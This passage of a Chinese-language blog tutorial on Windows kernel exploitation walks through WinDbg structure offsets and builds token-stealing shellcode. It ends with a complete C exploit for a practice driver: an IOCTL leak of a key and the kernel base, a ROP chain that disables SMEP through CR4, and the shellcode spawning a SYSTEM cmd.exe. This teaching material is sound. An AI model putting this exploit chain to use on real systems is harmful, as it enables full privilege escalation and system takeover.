TimerSuspended   : 0y0</span><br><span class="line">   +0x074 SuspendedWaitMode : 0y0</span><br><span class="line">   +0x074 SuspendSchedulerApcWait : 0y0</span><br><span class="line">   +0x074 CetUserShadowStack : 0y0</span><br><span class="line">   +0x074 BypassProcessFreeze : 0y0</span><br><span class="line">   +0x074 CetKernelShadowStack : 0y0</span><br><span class="line">   +0x074 StateSaveAreaDecoupled : 0y0</span><br><span class="line">   +0x074 Reserved         : 0y00000000 (0)</span><br><span class="line">   +0x074 MiscFlags        : 0n16385</span><br><span class="line">   +0x078 UserIdealProcessorFixed : 0y0</span><br><span class="line">   +0x078 IsolationWidth   : 0y0</span><br><span class="line">   +0x078 AutoAlignment    : 0y0</span><br><span class="line">   +0x078 DisableBoost     : 0y0</span><br><span class="line">   +0x078 AlertedByThreadId : 0y0</span><br><span class="line">   +0x078 QuantumDonation  : 0y0</span><br><span class="line">   +0x078 EnableStackSwap  : 0y1</span><br><span class="line">   +0x078 GuiThread        : 0y0</span><br><span class="line">   +0x078 DisableQuantum   : 0y0</span><br><span class="line">   +0x078 ChargeOnlySchedulingGroup : 0y0</span><br><span class="line">   +0x078 DeferPreemption  : 0y0</span><br><span class="line">   +0x078 QueueDeferPreemption : 0y0</span><br><span class="line">   +0x078 ForceDeferSchedule : 0y0</span><br><span class="line">   +0x078 SharedReadyQueueAffinity : 0y0</span><br><span class="line">   +0x078 FreezeCount      : 0y0</span><br><span class="line">   +0x078 TerminationApcRequest : 0y0</span><br><span class="line">   +0x078 AutoBoostEntriesExhausted : 0y1</span><br><span class="line">   +0x078 KernelStackResident : 0y1</span><br><span class="line">   +0x078 TerminateRequestReason : 0y00</span><br><span class="line">   +0x078 ProcessStackCountDecremented : 0y0</span><br><span class="line">   +0x078 RestrictedGuiThread : 0y0</span><br><span class="line">   +0x078 VpBackingThread  : 0y0</span><br><span class="line">   +0x078 EtwStackTraceCrimsonApcDisabled : 0y0</span><br><span class="line">   +0x078 EtwStackTraceApcInserted : 0y00000000 (0)</span><br><span class="line">   +0x078 ThreadFlags      : 0n196672</span><br><span class="line">   +0x07c Tag              : 0 &#x27;&#x27;</span><br><span class="line">   +0x07d CalloutActive    : 0y0</span><br><span class="line">   +0x07d ReservedStackInUse : 0y0</span><br><span class="line">   +0x07d UserStackWalkActive : 0y0</span><br><span class="line">   +0x07d SameThreadTransientFlagsReserved : 0y00000 (0)</span><br><span class="line">   +0x07d SameThreadTransientFlags : 0 &#x27;&#x27;</span><br><span class="line">   +0x07e RunningNonRetpolineCode : 0y0</span><br><span class="line">   +0x07e SpecCtrlSpare    : 0y0000000 (0)</span><br><span class="line">   +0x07e SpecCtrl         : 0 &#x27;&#x27;</span><br><span class="line">   +0x080 SystemCallNumber : 7</span><br><span class="line">   +0x084 ReadyTime        : 1</span><br><span class="line">   +0x088 FirstArgument    : 0x00000000`000000c8 Void</span><br><span class="line">   +0x090 TrapFrame        : 0xfffff30d`4ee76ae0 _KTRAP_FRAME</span><br><span class="line">   +0x098 ApcState         : _KAPC_STATE</span><br></pre></td></tr></table></figure>

<p>_KTHREAD + 0x98 是 _KAPC_STATE<br>_KAPC_STATE + 0x20 是  _KPROCESS</p>
<p>所以 _KTHREAD + 0xb8 是 _KPROCESS 也就是 _EPROCESS 內的 PCB </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KAPC_STATE 0xffffaf87`b5caf118</span><br><span class="line">nt!_KAPC_STATE</span><br><span class="line">   +0x000 ApcListHead      : [2] _LIST_ENTRY [ 0xffffaf87`b5caf118 - 0xffffaf87`b5caf118 ]</span><br><span class="line">   +0x020 Process          : 0xffffaf87`b5d5f080 _KPROCESS</span><br><span class="line">   +0x028 InProgressFlags  : 0 &#x27;&#x27;</span><br><span class="line">   +0x028 KernelApcInProgress : 0y0</span><br><span class="line">   +0x028 SpecialApcInProgress : 0y0</span><br><span class="line">   +0x029 KernelApcPending : 0 &#x27;&#x27;</span><br><span class="line">   +0x02a UserApcPendingAll : 0 &#x27;&#x27;</span><br><span class="line">   +0x02a SpecialUserApcPending : 0y0</span><br><span class="line">   +0x02a UserApcPending   : 0y0</span><br></pre></td></tr></table></figure>

<p>最後是要找 EPROCESS 內的 ActiveProcessLinks 來遍歷整個 EPROCESS，找出 system 的 token<br>他在 _EPROCESS + 0x1d8</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span>&#123;</span></span><br><span class="line">    _LIST_ENTRY* Flink;</span><br><span class="line">    _LIST_ENTRY* Blink;</span><br><span class="line">&#125; LIST_ENTRY;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt nt!_EPROCESS</span><br><span class="line">   +0x000 Pcb              : _KPROCESS</span><br><span class="line">   +0x1c8 ProcessLock      : _EX_PUSH_LOCK</span><br><span class="line">   +0x1d0 UniqueProcessId  : Ptr64 Void</span><br><span class="line">   +0x1d8 ActiveProcessLinks : _LIST_ENTRY</span><br></pre></td></tr></table></figure>

<p>所以目前 shellcode 先這樣寫</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov rdx, gs:[0x188];  // gs+0x188 find CurrentThread (_KTHREAD)</span><br><span class="line">mov rdx, [rdx+0xb8];  // find _KPROCESS = _EPROCESS</span><br><span class="line">mov r9, [rdx+0x1d8];  // find ActiveProcessLinks</span><br><span class="line">mov rcx, r9;	       // find Flink</span><br></pre></td></tr></table></figure>

<p>已經可以清楚的看到 rcx 內拿到了 Flink 了<br>接下來來寫循環查找，拿 token 跟寫 token</p>
<p>UniqueProcessId 位於 Flink-0x8<br>通過 rcx - 0x8 就可以拿到 UID</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+0x240 ExceptionPortValue : Uint8B</span><br><span class="line">+0x240 ExceptionPortState : Pos 0, 3 Bits</span><br><span class="line">+0x248 Token            : _EX_FAST_REF</span><br></pre></td></tr></table></figure>

<p>token 部分則在 _EPORCESS + 0x248<br>接下來就是循環去找了，直接上，最後用 loop 來去卡著 shell</p>
<p>最終 shellcode 在這</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">mov rdx, gs:[0x188]; </span><br><span class="line">mov rdx, [rdx+0xb8];</span><br><span class="line">mov r9, [rdx+0x1d8];</span><br><span class="line">mov rcx, r9;</span><br><span class="line"></span><br><span class="line">srch_for_sys:</span><br><span class="line">mov rdx, [rcx - 8];</span><br><span class="line">cmp rdx, 4;</span><br><span class="line">jz out1;</span><br><span class="line">mov rcx, [rcx];         </span><br><span class="line">jmp srch_for_sys;</span><br><span class="line"></span><br><span class="line">out1:</span><br><span class="line">mov rax, [rcx + 0x70];</span><br><span class="line"></span><br><span class="line">srch_our_proc:</span><br><span class="line">mov rdx, [rcx - 8];</span><br><span class="line">cmp rdx, 0x7788;</span><br><span class="line">jz final;</span><br><span class="line">mov rcx, [rcx];</span><br><span class="line">jmp srch_our_proc;</span><br><span class="line"></span><br><span class="line">final:</span><br><span class="line">mov [rcx + 0x70], rax;</span><br><span class="line"></span><br><span class="line">loop:</span><br><span class="line">jmp loop;</span><br><span class="line">ret;</span><br></pre></td></tr></table></figure>

<p>整個操作的結構圖<br><img src="https://hackmd.io/_uploads/Hku2Vilqyl.png" alt="image"></p>
<h2 id="script"><a href="#script" class="headerlink" title="script"></a>script</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DeVioctlCode 0x9C40240B</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DeviceName <span class="string">L&quot;\\\\.\\BreathofShadow&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADDR(x) ((x) ^ KEY)</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hexdump</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* data, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* byteData = (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*)data;</span><br><span class="line">    <span class="type">size_t</span> i, j;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; i += <span class="number">16</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%08zx  &quot;</span>, i);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">16</span>; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i + j &lt; size) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, byteData[i + j]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; |&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">16</span>; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i + j &lt; size) &#123;</span><br><span class="line">                <span class="type">unsigned</span> <span class="type">char</span> c = byteData[i + j];</span><br><span class="line">                <span class="keyword">if</span> (c &gt;= <span class="number">32</span> &amp;&amp; c &lt;= <span class="number">126</span>) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, c);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;|\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] shellcode...Try to EoP&quot;</span>);</span><br><span class="line">    Sleep(<span class="number">7</span>);</span><br><span class="line">    system(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    HANDLE hDevice = CreateFileW(DeviceName, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[X] Failed to open device. Error: %ld\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] Success open device\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uintptr_t</span> inputbuf1 = <span class="number">0x8181818181818181</span>;</span><br><span class="line">    <span class="type">size_t</span> KEY = <span class="number">0x0</span>;</span><br><span class="line">    <span class="type">char</span> outputbuf1[<span class="number">0x8</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    </span><br><span class="line">    DWORD bytesReturned = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    BOOL result1 = DeviceIoControl(</span><br><span class="line">        hDevice,</span><br><span class="line">        DeVioctlCode,</span><br><span class="line">        &amp;inputbuf1,</span><br><span class="line">        <span class="number">0x8</span>,</span><br><span class="line">        outputbuf1,</span><br><span class="line">        <span class="number">0x8</span>,</span><br><span class="line">        &amp;bytesReturned,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result1) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] IOCTL command sent successfully\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] LeakData: 0x%llx\n&quot;</span>,inputbuf1);</span><br><span class="line">        KEY = <span class="number">0x8181818181818181</span> ^ inputbuf1;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] LeakKey: 0x%llx\n&quot;</span>,KEY);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to send IOCTL command. Error: %ld\n&quot;</span>, GetLastError());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> stack_value[<span class="number">600</span>] = &#123;<span class="number">0x81</span>,<span class="number">0x81</span>,<span class="number">0x81</span>,<span class="number">0x81</span>,<span class="number">0x81</span>,<span class="number">0x81</span>,<span class="number">0x81</span>,<span class="number">0x81</span>&#125;;</span><br><span class="line">    <span class="type">char</span> outputbuf2[<span class="number">600</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    BOOL result2 = DeviceIoControl(</span><br><span class="line">        hDevice,</span><br><span class="line">        DeVioctlCode,</span><br><span class="line">        stack_value,</span><br><span class="line">        <span class="number">0x8</span>,</span><br><span class="line">        outputbuf2,</span><br><span class="line">        <span class="number">600</span>,</span><br><span class="line">        &amp;bytesReturned,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="type">uintptr_t</span>* STACK_VAL = (<span class="type">uintptr_t</span>*)stack_value;</span><br><span class="line">    <span class="type">uintptr_t</span> leak_kernel = STACK_VAL[<span class="number">33</span>]; <span class="comment">// Stack start + 0x108</span></span><br><span class="line">    <span class="type">uintptr_t</span> kernel_base = leak_kernel - <span class="number">0xb7b3c9</span>; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] Leak Kernel: 0x%llx\n&quot;</span>, leak_kernel);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] Kernel Base: 0x%llx\n&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    <span class="type">uintptr_t</span> payload[<span class="number">75</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i &lt; <span class="number">37</span>; i++)&#123;</span><br><span class="line">        payload[i] = ADDR(STACK_VAL[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    payload[<span class="number">37</span>] = ADDR(kernel_base + <span class="number">0x7a7baf</span>); <span class="comment">//0x1407a7baf: pop rcx ; ret ;</span></span><br><span class="line">    payload[<span class="number">38</span>] = ADDR(<span class="number">0x50ef0</span>);</span><br><span class="line">    payload[<span class="number">39</span>] = ADDR(kernel_base + <span class="number">0x47f027</span>); <span class="comment">// 0x14047f027: mov cr4, rcx ; ret ;</span></span><br><span class="line"></span><br><span class="line">    DWORD PID = GetCurrentProcessId();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    mov rdx, gs:[0x188]; </span></span><br><span class="line"><span class="comment">    mov rdx, [rdx+0xb8];</span></span><br><span class="line"><span class="comment">    mov r9, [rdx+0x1d8];</span></span><br><span class="line"><span class="comment">    mov rcx, r9;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    srch_for_sys:</span></span><br><span class="line"><span class="comment">    mov rdx, [rcx - 8];</span></span><br><span class="line"><span class="comment">    cmp rdx, 4;</span></span><br><span class="line"><span class="comment">    jz out1;</span></span><br><span class="line"><span class="comment">    mov rcx, [rcx];         </span></span><br><span class="line"><span class="comment">    jmp srch_for_sys;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    out1:</span></span><br><span class="line"><span class="comment">    mov rax, [rcx + 0x70];</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    srch_our_proc:</span></span><br><span class="line"><span class="comment">    mov rdx, [rcx - 8];</span></span><br><span class="line"><span class="comment">    cmp rdx, 0x7788;</span></span><br><span class="line"><span class="comment">    jz final;</span></span><br><span class="line"><span class="comment">    mov rcx, [rcx];</span></span><br><span class="line"><span class="comment">    jmp srch_our_proc;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    final:</span></span><br><span class="line"><span class="comment">    mov [rcx + 0x70], rax;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    loop:</span></span><br><span class="line"><span class="comment">    jmp loop;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    ret;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> shellcode[] = <span class="string">&quot;\x65\x48\x8B\x14\x25\x88\x01\x00\x00\x48\x8B\x92\xB8\x00\x00\x00\x4C\x8B\x8A\xD8\x01\x00\x00\x4C\x89\xC9\x48\x8B\x51\xF8\x48\x83\xFA\x04\x74\x05\x48\x8B\x09\xEB\xF1\x48\x8B\x41\x70\x48\x8B\x51\xF8\x48\x81\xFA\x88\x77\x00\x00\x74\x05\x48\x8B\x09\xEB\xEE\x48\x89\x41\x70\xEB\xFE\xC3&quot;</span>;</span><br><span class="line">    shellcode[<span class="number">52</span>]=(<span class="type">char</span>)PID;</span><br><span class="line">    shellcode[<span class="number">53</span>]=(<span class="type">char</span>)(PID&gt;&gt;<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uintptr_t</span> shellcode_ptr = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(shellcode_ptr, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line">    payload[<span class="number">40</span>] = ADDR(shellcode_ptr);</span><br><span class="line"></span><br><span class="line">    CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)get_shell, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    BOOL result3 = DeviceIoControl(</span><br><span class="line">        hDevice,</span><br><span class="line">        DeVioctlCode,</span><br><span class="line">        payload,</span><br><span class="line">        <span class="keyword">sizeof</span>(payload),</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="keyword">sizeof</span>(payload),</span><br><span class="line">        &amp;bytesReturned,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>最終可以在 windows 上通過執行 exploit 拿到 ntos 權限來 EoP</p>
<p><a target="_blank" rel="noopener" href="https://youtu.be/x8Z_jroNCEw">https://youtu.be/x8Z_jroNCEw</a></p>
<iframe width="560" height="315" src="https://www.youtube.com/embed/x8Z_jroNCEw?si=Pl8I_-81Sz72tKDP" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>



      
    </div>
    <footer class="article-footer">
      
      
      
      
      
      
      
      
      

    </footer>
  </div>
  
  <nav id="article-nav" data-aos="fade-up">
    
      <div class="article-nav-link-wrap article-nav-link-left">
        
          <img data-src="/images/posts_cover/LinuxKernelPwn/linuxkernel.png" data-sizes="auto" alt="Linux Kernel - EoP by modprobe &amp; 2021 3kCTF echo nerf" class="lazyload">
        
        <a href="/2025/04/04/Linux-Kernel-modprobe-EoP-and-2021-3kctf-echo-nerf/"></a>
        <div class="article-nav-caption">Newer</div>
        <h3 class="article-nav-title">
          
            Linux Kernel - EoP by modprobe &amp; 2021 3kCTF echo nerf
          
        </h3>
      </div>
    
    
    <div class="article-nav-link-wrap article-nav-link-right">
      
        <img data-src="/images/posts_cover/EOF/EOF.png" data-sizes="auto" alt="AIS3 EOF Final 2025 - Record" class="lazyload">
      
      <a href="/2025/03/27/AIS3-EOF-2025-Final/"></a>
      <div class="article-nav-caption">Older</div>
      <h3 class="article-nav-title">
        
          AIS3 EOF Final 2025 - Record
        
      </h3>
    </div>
    
  </nav>


</article>






</section>
        </div>
        
        
        <footer id="footer">
  <div style="width: 100%; overflow: hidden">
    <div class="footer-line"></div>
  </div>
  <div id="footer-info">
    
    <div>
      <span class="icon-copyright"></span>
      2020-2025
      <span class="footer-info-sep rotate"></span>
      Naup堇姬
    </div>
    
      <div>
        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
      </div>
    
    
      <div>
        <span class="icon-brush"></span>
        177.5k
        &nbsp;|&nbsp;
        <span class="icon-coffee"></span>
        15:34
      </div>
    
    
    
    
      <div>
        <span class="icon-eye"></span>
        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
        &nbsp;|&nbsp;
        <span class="icon-user"></span>
        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
      </div>
    
  </div>
</footer>

        
          <div class="sidebar-top">
            <div class="sidebar-top-taichi rotate"></div>
            <div class="arrow-up"></div>
          </div>
        
        <div id="mask" class="hide"></div>
      </div>
      <nav id="mobile-nav">
  <div class="sidebar-wrap">
    
      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
  <h3 class="toc-title">Contents</h3>
  <div class="sidebar-toc-wrapper toc-div-class" >
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows-Kernel-exploitation-Part-1"><span class="toc-number">1.</span> <span class="toc-text">Windows Kernel exploitation - Part 1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#What-is-Kernel"><span class="toc-number">1.1.</span> <span class="toc-text">What is Kernel</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kernel-exploit-on-windows"><span class="toc-number">1.2.</span> <span class="toc-text">Kernel exploit on windows</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Overview"><span class="toc-number">1.3.</span> <span class="toc-text">Overview</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#environment-setting"><span class="toc-number">1.4.</span> <span class="toc-text">environment setting</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#how-to-debug-kernel-use-windbg-attach-kernel"><span class="toc-number">1.4.1.</span> <span class="toc-text">how to debug kernel(use windbg attach kernel)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Basic-Knowledge"><span class="toc-number">1.5.</span> <span class="toc-text">Basic Knowledge</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#process"><span class="toc-number">1.5.1.</span> <span class="toc-text">process</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Thread"><span class="toc-number">1.5.2.</span> <span class="toc-text">Thread</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Integrity-Level"><span class="toc-number">1.5.3.</span> <span class="toc-text">Integrity Level</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ACL"><span class="toc-number">1.5.4.</span> <span class="toc-text">ACL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SID"><span class="toc-number">1.5.5.</span> <span class="toc-text">SID</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Access-Token"><span class="toc-number">1.5.6.</span> <span class="toc-text">Access Token</span></a><ol class="toc-child"><li class="toc-item 